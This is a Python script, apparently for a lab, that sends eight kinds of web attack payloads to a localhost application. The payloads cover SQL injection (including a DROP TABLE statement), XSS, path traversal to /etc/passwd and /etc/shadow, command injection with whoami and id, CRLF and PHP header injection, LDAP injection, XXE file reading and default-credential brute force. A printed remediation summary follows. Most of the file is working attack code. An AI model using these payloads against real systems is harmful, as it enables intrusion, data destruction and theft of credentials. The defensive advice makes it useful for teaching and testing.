#!/usr/bin/env python3
"""
Manual Web Application Attack Script
Demonstrates how to perform each attack using Python
Target: http://localhost:8080
"""

import requests
import json
from urllib.parse import quote

TARGET = "http://localhost:8080"

print("=" * 70)
print("MANUAL WEB APPLICATION ATTACK EXAMPLES")
print("=" * 70)

# ============================================================================
# ATTACK 1: SQL INJECTION
# ============================================================================

print("\n[1] SQL INJECTION ATTACKS")
print("-" * 70)

payloads = [
    "1' OR '1'='1",
    "1; DROP TABLE users;--",
    "1' OR 1=1 --",
    "admin' --",
    "' UNION SELECT NULL,NULL,NULL --"
]

for payload in payloads:
    url = f"{TARGET}/api/users?id={quote(payload)}"
    print(f"\n  Payload: {payload}")
    print(f"  URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        print(f"  Status: {response.status_code}")
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"  ⚠️  VULNERABLE: SQL error detected!")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 2: CROSS-SITE SCRIPTING (XSS)
# ============================================================================

print("\n\n[2] CROSS-SITE SCRIPTING (XSS) ATTACKS")
print("-" * 70)

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert(1)>",
]

for payload in xss_payloads:
    url = f"{TARGET}/search?q={quote(payload)}"
    print(f"\n  Payload: {payload}")
    print(f"  URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        if payload in response.text:
            print(f"  ⚠️  VULNERABLE: Payload reflected in response!")
        else:
            print(f"  ✓ Protected: Payload was escaped/filtered")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 3: PATH TRAVERSAL
# ============================================================================

print("\n\n[3] PATH TRAVERSAL ATTACKS")
print("-" * 70)

traversal_payloads = [
    "../../../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\config.ini",
    "../../../../../../../../etc/shadow",
]

for payload in traversal_payloads:
    url = f"{TARGET}/files/{quote(payload)}"
    print(f"\n  Payload: {payload}")
    print(f"  URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            if "root:" in response.text or "bin/bash" in response.text:
                print(f"  ⚠️  VULNERABLE: System file contents exposed!")
            else:
                print(f"  Response length: {len(response.text)} bytes")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 4: COMMAND INJECTION
# ============================================================================

print("\n\n[4] COMMAND INJECTION ATTACKS")
print("-" * 70)

command_payloads = [
    "test;whoami",
    "test|id",
    "test`uname -a`",
    "test$(whoami)",
    "test & dir",
]

for payload in command_payloads:
    url = f"{TARGET}/ping?host={quote(payload)}"
    print(f"\n  Payload: {payload}")
    print(f"  URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        if any(word in response.text.lower() for word in ["uid=", "root", "windows", "linux"]):
            print(f"  ⚠️  VULNERABLE: Command output detected in response!")
        else:
            print(f"  ✓ Protected: Command execution blocked")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 5: HTTP HEADER INJECTION
# ============================================================================

print("\n\n[5] HTTP HEADER INJECTION ATTACKS")
print("-" * 70)

headers_to_test = [
    {"X-Forwarded-For": "127.0.0.1; DROP TABLE users"},
    {"Authorization": "Bearer invalid_token_test"},
    {"User-Agent": "<?php system('whoami'); ?>"},
    {"X-Original-URL": "/admin"},
    {"X-Custom": "value\r\nSet-Cookie: admin=true"},
]

for headers in headers_to_test:
    print(f"\n  Custom Headers: {headers}")
    try:
        response = requests.get(TARGET, headers=headers, timeout=5)
        print(f"  Status: {response.status_code}")
        
        # Check if header injection was successful
        for key, value in headers.items():
            if value in response.text or value in str(response.headers):
                print(f"  ⚠️  SUSPICIOUS: Injected value found in response!")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 6: LDAP INJECTION
# ============================================================================

print("\n\n[6] LDAP INJECTION ATTACKS")
print("-" * 70)

ldap_payloads = [
    "*)(uid=*",
    "admin*)(|(cn=*",
    "*)(objectClass=*",
]

for payload in ldap_payloads:
    url = f"{TARGET}/login?user={quote(payload)}&pass=test"
    print(f"\n  Payload: {payload}")
    print(f"  URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        if "ldap" in response.text.lower() or "error" in response.text.lower():
            print(f"  ⚠️  SUSPICIOUS: LDAP error or info disclosure!")
        else:
            print(f"  ✓ No LDAP errors detected")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 7: XXE (XML EXTERNAL ENTITY) INJECTION
# ============================================================================

print("\n\n[7] XXE (XML EXTERNAL ENTITY) INJECTION ATTACKS")
print("-" * 70)

xxe_payloads = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
    
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8000/internal">
]>
<foo>&xxe;</foo>''',
]

for payload in xxe_payloads:
    print(f"\n  Payload (truncated): {payload[:100]}...")
    try:
        response = requests.post(
            f"{TARGET}/api/xml",
            data=payload,
            headers={"Content-Type": "application/xml"},
            timeout=5
        )
        if "root:" in response.text or "XML" in response.text:
            print(f"  ⚠️  VULNERABLE: File contents or XML errors exposed!")
        else:
            print(f"  ✓ Protected: XXE disabled")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# ATTACK 8: HTTP BASIC AUTH BRUTE FORCE
# ============================================================================

print("\n\n[8] HTTP BASIC AUTH BRUTE FORCE")
print("-" * 70)

credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("test", "test"),
]

for username, password in credentials:
    print(f"\n  Trying: {username}:{password}")
    try:
        response = requests.get(
            f"{TARGET}/admin",
            auth=(username, password),
            timeout=5
        )
        if response.status_code == 200:
            print(f"  ✅ SUCCESS: Valid credentials found!")
            print(f"  Response: {response.text[:100]}")
        elif response.status_code == 401:
            print(f"  ✗ Invalid credentials (401)")
        else:
            print(f"  Status: {response.status_code}")
    except Exception as e:
        print(f"  Error: {e}")


# ============================================================================
# SUMMARY
# ============================================================================

print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
print("""
This script demonstrates how to manually test each vulnerability.

To protect your application:

1. SQL Injection: Use parameterized queries
   - Bad:  f"SELECT * FROM users WHERE id = {user_input}"
   - Good: db.execute("SELECT * FROM users WHERE id = ?", (user_input,))

2. XSS: Escape/sanitize all user input
   - Use frameworks' built-in escaping
   - Validate input on both frontend and backend

3. Path Traversal: Validate file paths
   - Use safe path functions
   - Check that resolved path is within allowed directory

4. Command Injection: Never use shell=True with user input
   - Use subprocess.run() with list of args
   - Validate all command inputs

5. Header Injection: Validate and sanitize headers
   - Remove newlines and special characters
   - Use security libraries

6. LDAP Injection: Escape LDAP filter special chars
   - Use proper LDAP escaping functions
   - Validate input

7. XXE: Disable external entity processing
   - Use defusedxml library
   - Disable DOCTYPE processing

8. Weak Auth: Use strong default credentials
   - Implement rate limiting
   - Use MFA
   - Hash passwords properly

For more info: https://owasp.org/www-project-top-ten/
""")

print("\n✅ Script execution complete!")
